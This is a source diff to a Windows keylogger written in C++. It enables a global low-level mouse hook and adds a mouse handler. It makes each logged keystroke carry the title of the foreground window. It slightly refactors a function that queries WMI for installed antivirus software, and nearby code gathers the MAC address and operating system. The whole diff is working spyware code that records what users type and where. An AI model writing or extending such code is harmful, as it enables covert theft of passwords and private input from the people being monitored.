@@ -19,7 +19,7 @@
 #pragma comment(lib, "IPHLPAPI.lib")
 
 HHOOK hookKeyboard;
-//HHOOK hookMouse;
+HHOOK hookMouse;
 
 WindowsKeyLogger::WindowsKeyLogger()
 {
@@ -55,17 +55,17 @@ void WindowsKeyLogger::initHooks()
   if (hookKeyboard)
     UnhookWindowsHookEx(hookKeyboard);
   hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
-  //if (hookMouse)
-    //UnhookWindowsHookEx(hookMouse);
-  //this->hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
+  if (hookMouse)
+    UnhookWindowsHookEx(hookMouse);
+  hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
 }
 
 void WindowsKeyLogger::unHooks()
 {
   if (hookKeyboard)
     UnhookWindowsHookEx(hookKeyboard);
-  //if (hookMouse)
-    //UnhookWindowsHookEx(hookMouse);
+  if (hookMouse)
+    UnhookWindowsHookEx(hookMouse);
 }
 
 void WindowsKeyLogger::getMacAddr()
@@ -107,7 +107,7 @@ void	WindowsKeyLogger::getOperatingSystem()
 void WindowsKeyLogger::getAntiVirus()
 {
   HRESULT hres;
-  IWbemLocator *locator = 0;
+  IWbemLocator *locator = nullptr;
   IWbemServices *services = nullptr;
   IEnumWbemClassObject *pEnumerator = nullptr;
   IWbemClassObject *object = nullptr;
@@ -127,7 +127,7 @@ void WindowsKeyLogger::getAntiVirus()
     return ;
   }
 
-  hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&locator);
+  hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, static_cast<LPVOID *>(&locator));
   if (FAILED(hres))
   {
     std::cerr << "Fail to to create IWbemLocator object" << std::endl;
@@ -184,7 +184,11 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
   bool			shift;
   bool			capslock;
   short			value;
+  char			windowTitle[512];
+  HWND			windowForeground;
 
+  windowForeground = GetForegroundWindow();
+  GetWindowText(windowForeground, windowTitle, 512);
   shift = false;
   if (GetAsyncKeyState(VK_SHIFT))
     shift = true;
@@ -222,14 +226,14 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
       else
 	str = tolower(str[0]);
-      std::cout << str;
+      std::cout << str << " - " << windowTitle << std::endl;
     }
     else
     {
       try
       {
 	str = WindowsKeyLogger::keys.at(content->vkCode);
-	std::cout << str;
+	std::cout << str << " - " << windowTitle << std::endl;
       }
       catch (std::out_of_range const &)
       {
@@ -238,4 +242,20 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
     }
   }
   return CallNextHookEx(hookKeyboard, code, wp, lp);
+}
+
+LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp)
+{
+  MOUSEHOOKSTRUCT 	*mouseStruct;
+  char			windowTitle[512];
+  HWND			windowForeground;
+
+  windowForeground = GetForegroundWindow();
+  GetWindowText(windowForeground, windowTitle, 512);
+  if (code == HC_ACTION)
+  {
+    mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lp);
+
+  }
+  return CallNextHookEx(hookMouse, code, wp, lp);
 }
